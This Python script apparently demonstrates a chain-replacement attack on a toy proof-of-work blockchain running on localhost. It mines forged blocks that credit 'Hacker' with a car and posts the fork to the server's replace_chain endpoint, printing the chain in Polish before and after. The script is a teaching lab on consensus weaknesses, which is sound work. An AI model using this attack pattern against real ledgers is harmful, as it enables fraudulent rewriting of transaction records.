import hashlib
import json
from time import time, sleep
import requests


class Attacker:
    def __init__(self, blockchain_url):
        self.blockchain_url = blockchain_url
        self.forked_chain = self.get_chain_from_server()

    def get_chain_from_server(self):
        response = requests.get(f'{self.blockchain_url}/chain')
        if response.status_code == 200:
            return response.json()['chain']
        else:
            print("Failed to fetch the chain from the server")
            return []

    def mine_on_fork(self, num_blocks):
        for _ in range(num_blocks):
            last_block = self.forked_chain[-1]
            proof = self.proof_of_work(last_block['proof'])
            new_block = {
                'index': len(self.forked_chain) + 1,
                'timestamp': time(),
                'transactions': [{'user': 'Hacker', 'car': 'New_Car'}],
                'proof': proof,
                'previous_hash': self.hash(last_block),
            }
            self.forked_chain.append(new_block)
            sleep(0.1)

    @staticmethod
    def hash(block):
        block_string = json.dumps(block, sort_keys=True).encode()
        return hashlib.sha256(block_string).hexdigest()

    def proof_of_work(self, last_proof):
        proof = 0
        while not self.valid_proof(last_proof, proof):
            proof += 1
        return proof

    @staticmethod
    def valid_proof(last_proof, proof):
        guess = f'{last_proof}{proof}'.encode()
        guess_hash = hashlib.sha256(guess).hexdigest()
        return guess_hash[:4] == "0000"

    def replace_chain(self):
        url = f'{self.blockchain_url}/replace_chain'
        response = requests.post(url, json={'chain': self.forked_chain})
        if response.status_code == 200:
            print(response.json()['message'])
        else:
            print("Failed to replace chain")


if __name__ == '__main__':
    blockchain_url = 'http://localhost:5000'

    attacker = Attacker(blockchain_url)

    print("Stan łańcucha bloków przed atakiem:")
    for block in attacker.forked_chain:
        print(block)

    attacker.mine_on_fork(2)

    attacker.replace_chain()

    print("Stan łańcucha bloków po ataku:")
    for block in attacker.forked_chain:
        print(block)
